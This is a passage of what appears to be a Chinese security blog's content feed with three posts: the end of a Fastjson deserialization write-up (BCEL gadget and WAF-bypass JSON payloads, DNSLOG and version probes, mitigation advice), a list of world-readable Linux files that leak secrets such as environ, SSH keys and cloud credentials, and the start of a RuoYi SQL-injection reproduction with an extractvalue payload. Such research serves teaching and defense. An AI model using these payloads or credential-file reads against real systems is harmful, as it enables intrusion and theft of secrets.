class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,<br>        <span class="hljs-string">&quot;driverClassLoader&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;driverClassName&quot;</span>: <span class="hljs-string">&quot;$$BCEL$$[恶意字节码]&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-8-1-2-83版本修复与后续发展"><a href="#3-8-1-2-83版本修复与后续发展" class="headerlink" title="3.8 1.2.83版本修复与后续发展"></a>3.8 1.2.83版本修复与后续发展</h2><h3 id="3-8-1-1-2-83版本修复"><a href="#3-8-1-1-2-83版本修复" class="headerlink" title="3.8.1 1.2.83版本修复"></a>3.8.1 1.2.83版本修复</h3><p><strong>修复措施</strong> 2022年3月3日，阿里巴巴发布Fastjson 1.2.83版本，修复了CVE-2022-25845漏洞 </p><p><strong>主要改进</strong></p><ul><li>加强了对<code>Throwable</code>类型的安全检测</li><li>完善了<code>checkAutoType</code>机制</li><li>增强了<code>safeMode</code>的防护能力</li></ul><h3 id="3-8-2-Fastjson项目状态"><a href="#3-8-2-Fastjson项目状态" class="headerlink" title="3.8.2 Fastjson项目状态"></a>3.8.2 Fastjson项目状态</h3><p><strong>项目归档</strong> 2024年3月3日，Fastjson 1.x项目被官方归档，不再维护 </p><p><strong>官方建议</strong></p><ul><li>推荐升级到Fastjson 2.0版本</li><li>Fastjson 2.0性能更好，安全性更高</li><li>提供了兼容包，便于迁移</li></ul><h3 id="3-8-3-Fastjson-2-0安全改进"><a href="#3-8-3-Fastjson-2-0安全改进" class="headerlink" title="3.8.3 Fastjson 2.0安全改进"></a>3.8.3 Fastjson 2.0安全改进</h3><p><strong>架构重构</strong></p><ul><li>完全重写了反序列化引擎</li><li>默认禁用<code>autoType</code>功能</li><li>更严格的类型检查机制</li></ul><p><strong>安全特性：</strong></p><ul><li>内置更完善的黑名单</li><li>支持更细粒度的安全配置</li><li>提供了更好的安全审计功能</li></ul><h2 id="3-9-最新绕过技术与防护对抗"><a href="#3-9-最新绕过技术与防护对抗" class="headerlink" title="3.9 最新绕过技术与防护对抗"></a>3.9 最新绕过技术与防护对抗</h2><h3 id="3-9-1-WAF绕过技术"><a href="#3-9-1-WAF绕过技术" class="headerlink" title="3.9.1 WAF绕过技术"></a>3.9.1 WAF绕过技术</h3><p><strong>编码绕过</strong></p><ul><li>Base64编码：在multipart请求中使用<code>Content-Transfer-Encoding: base64</code></li><li>QP编码：使用<code>quoted-printable</code>编码绕过WAF检测</li></ul><p><strong>嵌套绕过</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;xx&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;x&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>            <span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<br>        <span class="hljs-string">&quot;c&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,<br>            <span class="hljs-string">&quot;driverClassLoader&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;driverClassName&quot;</span>: <span class="hljs-string">&quot;$$BCEL$$[恶意字节码]&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-9-2-现代防护策略"><a href="#3-9-2-现代防护策略" class="headerlink" title="3.9.2 现代防护策略"></a>3.9.2 现代防护策略</h3><p><strong>多层防护</strong></p><ol><li><strong>版本升级</strong> 升级到Fastjson 2.0或最新的1.2.83+版本</li><li><strong>安全配置</strong> 强制开启<code>safeMode</code>模式</li><li><strong>输入验证</strong> 严格验证JSON输入，过滤<code>@type</code>字段</li><li><strong>网络隔离</strong> 限制应用的外网访问，防止JNDI&#x2F;RMI攻击</li><li><strong>运行时防护</strong> 使用RASP等运行时应用自我保护技术</li></ol><p><strong>监控告警</strong></p><ul><li>监控包含<code>@type</code>的JSON请求</li><li>检测异常的网络连接（RMI、LDAP等）</li><li>监控异常的类加载行为</li><li>记录反序列化异常和错误</li></ul><h2 id="3-10-漏洞检测技术"><a href="#3-10-漏洞检测技术" class="headerlink" title="3.10 漏洞检测技术"></a>3.10 漏洞检测技术</h2><h3 id="3-10-1-版本探测"><a href="#3-10-1-版本探测" class="headerlink" title="3.10.1 版本探测"></a>3.10.1 版本探测</h3><p><strong>无报错探测：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"># 区分<span class="hljs-number">1.2</span><span class="hljs-number">.83</span>/<span class="hljs-number">1.2</span><span class="hljs-number">.24</span>（不报错）与<span class="hljs-number">1.2</span><span class="hljs-number">.25</span>-<span class="hljs-number">1.2</span><span class="hljs-number">.80</span>（报错）<br>&#123;<span class="hljs-string">&quot;zero&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Exception&quot;</span>,<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.XxException&quot;</span>&#125;&#125;<br><br># 区分<span class="hljs-number">1.2</span><span class="hljs-number">.24</span>-<span class="hljs-number">1.2</span><span class="hljs-number">.68</span>（不报错）与<span class="hljs-number">1.2</span><span class="hljs-number">.70</span>-<span class="hljs-number">1.2</span><span class="hljs-number">.83</span>（报错）<br>&#123;<span class="hljs-string">&quot;zero&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span>&#125;&#125;<br><br># 检测<span class="hljs-number">1.2</span><span class="hljs-number">.80</span>及以下版本（CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">25845</span>）<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Exception&quot;</span>,<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><strong>延迟探测</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"># 通过请求本机端口的延迟差异判断版本<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:1099/test&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br># CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">25845</span>延迟探测<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Exception&quot;</span>,<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:1099/test&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-10-2-DNSLOG检测"><a href="#3-10-2-DNSLOG检测" class="headerlink" title="3.10.2 DNSLOG检测"></a>3.10.2 DNSLOG检测</h3><p><strong>不同版本的DNS探测</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"># Fastjson &lt;<span class="hljs-number">1.2</span><span class="hljs-number">.43</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;http://dnslog.com&quot;</span>&#125;<br><br># Fastjson &lt;<span class="hljs-number">1.2</span><span class="hljs-number">.48</span>  <br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog.com&quot;</span>&#125;<br><br># Fastjson &lt;<span class="hljs-number">1.2</span><span class="hljs-number">.68</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog.com&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet6Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog.com&quot;</span>&#125;<br><br># CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">25845</span> DNSLOG探测<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Exception&quot;</span>,<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog.com&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-10-3-safeMode检测"><a href="#3-10-3-safeMode检测" class="headerlink" title="3.10.3 safeMode检测"></a>3.10.3 safeMode检测</h3><p><strong>检测是否开启safeMode</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"># 如果开启safeMode，以下payload不会触发任何反序列化<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;java.lang.String&quot;</span>&#125;<br><br># 检测autoType是否完全禁用<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.util.HashMap&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-11-防御建议"><a href="#3-11-防御建议" class="headerlink" title="3.11 防御建议"></a>3.11 防御建议</h2><h3 id="3-11-1-版本升级策略"><a href="#3-11-1-版本升级策略" class="headerlink" title="3.11.1 版本升级策略"></a>3.11.1 版本升级策略</h3><ol><li><strong>首选方案：</strong> 升级到Fastjson 2.0版本<ul><li>性能更好，安全性更高</li><li>提供兼容包，便于迁移</li><li>官方长期维护支持</li></ul></li><li><strong>次选方案：</strong> 升级到1.2.83+版本并开启<code>safeMode</code><ul><li>注意1.x版本已停止维护</li><li>仅作为临时过渡方案</li></ul></li></ol><h3 id="3-11-2-安全配置"><a href="#3-11-2-安全配置" class="headerlink" title="3.11.2 安全配置"></a>3.11.2 安全配置</h3><p><strong>强制开启safeMode</strong></p><ol><li>ParserConfig.getGlobalInstance().setSafeMode(true);</li></ol><p><strong>禁用autoType</strong></p><ol start="2"><li>ParserConfig.getGlobalInstance().setAutoTypeSupport(false);</li><li><strong>严格白名单：</strong> 如必须使用autoType，严格配置白名单</li></ol><h3 id="3-11-3-应用层防护"><a href="#3-11-3-应用层防护" class="headerlink" title="3.11.3 应用层防护"></a>3.11.3 应用层防护</h3><ol><li><strong>输入验证</strong> 严格验证JSON输入，过滤<code>@type</code>字段</li><li><strong>网络隔离</strong> 限制应用的外网访问，防止JNDI&#x2F;RMI攻击</li><li><strong>运行时防护</strong> 使用RASP等运行时应用自我保护技术</li><li><strong>监控告警</strong> 监控异常的网络连接和类加载行为</li></ol><h2 id="3-12-总结"><a href="#3-12-总结" class="headerlink" title="3.12 总结"></a>3.12 总结</h2><p>Fastjson反序列化漏洞的演进体现了攻防对抗的典型过程：</p><ul><li><strong>1.2.24及之前：</strong> 无防护，直接利用</li><li><strong>1.2.25-1.2.47</strong> 黑名单防护，各种绕过技术</li><li><strong>1.2.48-1.2.67</strong> 缓存机制改进，利用难度增加</li><li><strong>1.2.68-1.2.80</strong> safeMode机制，但存在Throwable绕过（CVE-2022-25845）</li><li><strong>1.2.83+</strong> 修复Throwable绕过，最严格防护</li><li><strong>Fastjson 2.0</strong> 架构重构，安全性根本改善</li></ul><p>每个版本的修复都会被新的绕过方法突破，直到Fastjson 2.0的架构重构。这提醒开发者需要：</p><ol><li>及时跟进安全更新，优先升级到Fastjson 2.0</li><li>采用多层防护策略，不依赖单一安全机制</li><li>对用户输入保持警惕，严格验证和过滤</li><li>在安全性和功能性之间找到平衡，避免过度依赖autoType功能</li><li>建立完善的安全监控和应急响应机制</li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/">https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/</a></li><li><a href="https://xz.aliyun.com/t/16547time__1311=GuD%3DY5BK0I8x%2FD0lD2mDumADO%2Bn2xPi%3DPa4D">https://xz.aliyun.com/t/16547time__1311&#x3D;GuD%3DY5BK0I8x%2FD0lD2mDumADO%2Bn2xPi%3DPa4D</a></li><li><a href="https://xz.aliyun.com/t/14872time__1311=GqA2Y50K4IxBqDwqeqBK96DmE9O83x">https://xz.aliyun.com/t/14872time__1311&#x3D;GqA2Y50K4IxBqDwqeqBK96DmE9O83x</a></li><li><a href="https://www.cnblogs.com/nice0e3/p/14601670.html#0x02-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">https://www.cnblogs.com/nice0e3/p/14601670.html</a></li><li><a href="https://www.cnblogs.com/LINGX5/p/18797812">https://www.cnblogs.com/LINGX5/p/18797812</a></li><li><a href="https://rivers.chaitin.cn/blog/cq70jnqp1rhtmlvvdo2g">https://rivers.chaitin.cn/blog/cq70jnqp1rhtmlvvdo2g</a></li><li><a href="https://www.cnblogs.com/LINGX5/p/18802834">https://www.cnblogs.com/LINGX5/p/18802834</a></li><li><a href="https://github.com/safe6Sec/Fastjson">https://github.com/safe6Sec/Fastjson</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Gadget</tag>
      
      <tag>Bypass</tag>
      
      <tag>Fastjson</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux全局文件信息泄露</title>
    <link href="/2025/08/21/Linux%E5%85%A8%E5%B1%80%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <url>/2025/08/21/Linux%E5%85%A8%E5%B1%80%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<p>在Linux系统（包括Docker容器）中，即使以低权限用户（如<code>nobody</code>）运行，也有大量全局可读的文件可能成为信息泄露的来源。攻击者或安全研究人员会系统地检查这些文件，以了解系统配置、寻找凭证、发现代码漏洞或获取下一步攻击的线索。</p><p>以下是这些可能泄露信息的文件和目录的全面总结，按位置和重要性分类：</p><h3 id="1-proc-进程和内核信息系统"><a href="#1-proc-进程和内核信息系统" class="headerlink" title="1. /proc - 进程和内核信息系统"></a>1. <code>/proc</code> - 进程和内核信息系统</h3><p><code>/proc</code>是一个虚拟文件系统，它实时反映了内核和进程的状态。这是获取动态信息的金矿，几乎所有文件都是全局可读的。</p><ul><li><strong><code>/proc/self/environ</code></strong><ul><li><strong>内容</strong>: 当前进程的环境变量，以 <code>KEY=VALUE</code> 的形式，用空字节(<code>\x00</code>)分隔。</li><li><strong>泄露风险</strong>: <strong>极高</strong>。可能包含数据库连接字符串、API密钥、密码、第三方服务的访问令牌、应用密钥(Secret Key)等。</li><li><strong>示例</strong>: <code>DATABASE_URL=postgres://user:password@host:port/db</code></li></ul></li><li><strong><code>/proc/self/cmdline</code></strong><ul><li><strong>内容</strong>: 启动当前进程的完整命令，参数同样以空字节分隔。</li><li><strong>泄露风险</strong>: <strong>高</strong>。启动参数中可能硬编码了密码、配置文件路径或敏感的配置信息。</li><li><strong>示例</strong>: <code>python app.py --secret-token=abcdef123456</code></li></ul></li><li><strong><code>/proc/self/cwd</code></strong><ul><li><strong>内容</strong>: 一个指向当前进程工作目录的符号链接。</li><li><strong>泄露风险</strong>: 低。但可以确认应用程序的根目录位置，帮助攻击者构造其他文件的相对路径。</li></ul></li><li><strong><code>/proc/self/mountinfo</code></strong> 或 <strong><code>/proc/mounts</code></strong><ul><li><strong>内容</strong>: 当前容器的文件系统挂载信息。</li><li><strong>泄露风险</strong>: 中。可以揭示容器使用了哪种文件系统（如OverlayFS），有时会泄露Docker在宿主机上存储层的部分路径结构，为更高级的攻击提供信息。</li></ul></li><li><strong><code>/proc/version</code></strong><ul><li><strong>内容</strong>: Linux内核的版本信息。</li><li><strong>泄露风险</strong>: 低。但可用于查找特定版本的内核漏洞，进行权限提升。</li></ul></li><li><strong><code>/proc/net/tcp</code></strong>, <strong><code>/proc/net/udp</code></strong><ul><li><strong>内容</strong>: 当前的网络连接状态。</li><li><strong>泄露风险</strong>: 中。可以发现应用正在监听哪些端口，或正在与哪些内部&#x2F;外部IP地址通信，帮助绘制网络拓扑。</li></ul></li></ul><h3 id="2-etc-系统配置文件"><a href="#2-etc-系统配置文件" class="headerlink" title="2. /etc - 系统配置文件"></a>2. <code>/etc</code> - 系统配置文件</h3><p>存放系统级软件的配置文件，大部分是全局可读的。</p><ul><li><strong><code>/etc/passwd</code></strong>:<ul><li><strong>内容</strong>: 系统所有用户的列表，以及他们的用户ID(UID)、组ID(GID)、家目录等信息。</li><li><strong>泄露风险</strong>: 低。虽然不包含密码，但提供了可用的用户名列表。</li></ul></li><li><strong><code>/etc/crontab</code></strong> 和 <strong><code>/etc/cron.d/</code></strong> 目录下的文件<ul><li><strong>内容</strong>: 系统定时任务的配置。</li><li><strong>泄露风险</strong>: <strong>高</strong>。定时任务可能会以高权限运行，脚本中可能包含硬编码的密码或不安全的文件操作，是权限提升和发现漏洞的重要途径。</li></ul></li><li><strong><code>/etc/hosts</code></strong><ul><li><strong>内容</strong>: 主机名到IP地址的静态映射。</li><li><strong>泄露风险</strong>: 中。可能会暴露内部服务的域名和IP地址，例如 <code>10.0.0.5 database-internal</code>。</li></ul></li><li><strong><code>/etc/resolv.conf</code></strong><ul><li><strong>内容</strong>: DNS服务器的配置。</li><li><strong>泄露风险</strong>: 低。可以了解网络环境的DNS配置。</li></ul></li><li><strong><code>/etc/os-release</code></strong> 或 <strong><code>/etc/issue</code></strong><ul><li><strong>内容</strong>: 操作系统的发行版和版本信息。</li><li><strong>泄露风险</strong>: 低。帮助攻击者确定操作系统类型，以便使用特定的漏洞。</li></ul></li></ul><h3 id="3-Web应用和源代码相关文件"><a href="#3-Web应用和源代码相关文件" class="headerlink" title="3. Web应用和源代码相关文件"></a>3. Web应用和源代码相关文件</h3><p>这是最直接的信息泄露来源，通常位于 <code>/app</code>, <code>/var/www/html</code>, <code>/usr/src/app</code> 等目录。</p><ul><li><strong>源代码文件</strong> (<code>.py</code>, <code>.js</code>, <code>.php</code>, <code>.rb</code>, <code>config.json</code> 等)<ul><li><strong>内容</strong>: 应用的业务逻辑和配置。</li><li><strong>泄露风险</strong>: <strong>致命</strong>。直接暴露所有秘密、逻辑漏洞、API端点和数据库结构。</li></ul></li><li><strong><code>.env</code>文件</strong><ul><li><strong>内容</strong>: 专门用于存储环境变量的文件，通常包含顶级机密。</li><li><strong>泄露风险</strong>: <strong>致命</strong>。包含数据库密码、API密钥、调试模式开关等。</li></ul></li><li><strong>版本控制目录 (<code>.git</code>)</strong><ul><li><strong>内容</strong>: Git仓库的元数据。</li><li><strong>泄露风险</strong>: <strong>致命</strong>。攻击者可以通过读取 <code>.git/</code> 目录下的文件（如<code>.git/logs/HEAD</code>, <code>.git/index</code>）来重构整个项目的源代码，包括历史版本中的秘密信息。</li></ul></li><li><strong>临时文件和备份文件</strong> (<code>.bak</code>, <code>.swp</code>, <code>.old</code>, <code>~</code> 结尾的文件)<ul><li><strong>内容</strong>: 开发者无意中留下的代码或配置备份。</li><li><strong>泄露风险</strong>: <strong>高</strong>。可能包含旧版本的、含有敏感信息的代码。</li></ul></li><li><strong>依赖列表</strong> (<code>requirements.txt</code>, <code>package.json</code>, <code>pom.xml</code>)<ul><li><strong>内容</strong>: 项目的所有依赖库及其版本。</li><li><strong>泄露风险</strong>: 中。攻击者可以根据此列表查找存在已知漏洞（CVE）的依赖库版本，进行攻击。</li></ul></li></ul><h3 id="4-用户home目录"><a href="#4-用户home目录" class="headerlink" title="4. 用户home目录"></a>4. 用户<code>home</code>目录</h3><p>即使是<code>root</code>或其他用户的家目录，也可能因权限配置不当而被读取。</p><ul><li><strong><code>~/.bash_history</code></strong> 或 <strong><code>~/.ash_history</code></strong><ul><li><strong>内容</strong>: 用户的shell命令历史记录。</li><li><strong>泄露风险</strong>: <strong>极高</strong>。开发者可能在命令行中输入过密码、<code>curl</code>命令中包含过API密钥、或执行过包含敏感信息的文件操作。</li></ul></li><li><strong><code>~/.ssh/</code></strong> 目录<ul><li><strong>内容</strong>: SSH客户端配置、私钥(<code>id_rsa</code>)、公钥(<code>id_rsa.pub</code>)、已知主机(<code>known_hosts</code>)。</li><li><strong>泄露风险</strong>: <strong>致命</strong>。如果私钥可读，攻击者可以用它登录到其他服务器。</li></ul></li><li><strong><code>~/.aws/credentials</code>, <code>~/.docker/config.json</code>, <code>~/.gcloud/</code></strong><ul><li><strong>内容</strong>: 各种命令行工具保存的凭证。</li><li><strong>泄露风险</strong>: <strong>致命</strong>。直接泄露云服务、容器仓库等平台的访问权限。</li></ul></li></ul><h3 id="5-日志文件-var-log"><a href="#5-日志文件-var-log" class="headerlink" title="5. 日志文件 (/var/log)"></a>5. 日志文件 (<code>/var/log</code>)</h3><ul><li><strong>应用日志</strong> (<code>/var/log/app.log</code> 或其他自定义位置)<ul><li><strong>内容</strong>: 应用程序运行时产生的日志。</li><li><strong>泄露风险</strong>: <strong>高</strong>。开发人员为了调试方便，可能会记录下请求参数、完整的SQL查询、用户个人信息甚至异常堆栈中的敏感数据。</li></ul></li><li><strong>Web服务器日志</strong> (<code>/var/log/nginx/access.log</code>, <code>/var/log/apache2/error.log</code>)<ul><li><strong>内容</strong>: Web服务器的访问和错误日志。</li><li><strong>泄露风险</strong>: 中。可以泄露内部路径、客户端IP、用户行为模式等。错误日志可能泄露配置问题或后端错误信息。</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>攻防渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>信息泄露</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>若依框架全系列漏洞复现与代码审计</title>
    <link href="/2025/08/16/%E8%8B%A5%E4%BE%9D%E6%A1%86%E6%9E%B6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%85%A8%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/08/16/%E8%8B%A5%E4%BE%9D%E6%A1%86%E6%9E%B6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%85%A8%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h1><h2 id="1-1-前言"><a href="#1-1-前言" class="headerlink" title="1.1 前言"></a>1.1 前言</h2><p>在之前尝试挖 src 和 cnvd 的过程中，找到的管理系统，十个里面四个是若依或者若依二开；还有四个是 Jeecg-boot 或者 Jeecg-boot 二开；剩下两个，一个是看来就很难打的系统，另一个是看起来的很垃圾的，即使没有弱口令，在其他地方也能进的感觉；</p><p>因此，打算把这两个大框架的漏洞全部复现一下，顺便也深入学习一下代码审计（因为这两个框架都开源嘛，所以深入了解一下漏洞成因）；</p><p>本次用来进行漏洞复现的若依主要是4.5.0、4.6.0、4.7.0、4.7.1、4.7.2、4.7.8、4.8.0 几个版本进行测试；</p><p>java 版本使用的是 jdk1.8.0_121，主要是为了远程 jndi 注入的实现；</p><h2 id="1-2-简介"><a href="#1-2-简介" class="headerlink" title="1.2 简介"></a>1.2 简介</h2><p>Ruoyi（若依）是一款基于Spring Boot和Vue.js开发的快速开发平台。它提供了许多常见的后台管理系统所需的功能和组件，包括权限管理、定时任务、代码生成、日志管理等。Ruoyi的目标是帮助开发者快速搭建后台管理系统，提高开发效率。</p><p>若依有很多版本，其中使用最多的是Ruoyi单应用版本（RuoYi），Ruoyi前后端分离版本（RuoYi-Vue），Ruoyi微服务版本（RuoYi-Cloud），Ruoyi移动版本（RuoYi-App）。</p><h1 id="2-SQL-注入漏洞"><a href="#2-SQL-注入漏洞" class="headerlink" title="2 SQL 注入漏洞"></a>2 SQL 注入漏洞</h1><h2 id="2-1-注入点-role-list接口（"><a href="#2-1-注入点-role-list接口（" class="headerlink" title="2.1 注入点/role/list接口（&lt;V4.6.2）"></a>2.1 注入点<code>/role/list</code>接口（&lt;V4.6.2）</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754624497306-5f7b9986-108f-46b1-9e9a-651adec5baca.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754624525515-37180bc6-6d9c-423c-afe1-213e6b4c3d08.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">&amp;params%5BdataScope%5D=and extractvalue(1,concat(0x7e,(select user()),0x7e))<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/role/list</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.10<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>201<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: 